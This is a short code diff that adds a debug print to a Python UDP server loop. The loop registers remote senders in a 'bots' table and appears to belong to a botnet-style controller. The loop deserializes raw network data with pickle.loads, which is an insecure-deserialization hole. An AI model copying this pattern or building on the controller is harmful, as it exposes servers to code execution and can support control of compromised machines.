@@ -74,6 +74,7 @@ class Network:
             try:
                 data, addr = server_socket.recvfrom(1024)
                 message = pickle.loads(data)
+                print(message)
                 if addr[0] not in self.bots and message["Status"] is True:
                     self.bots[addr[0]] = {"name": addr[1], "Status": False, "PC": message["PC"], "Data": None}
                     print("Получено сообщение от {0}: {1}".format(addr, message))
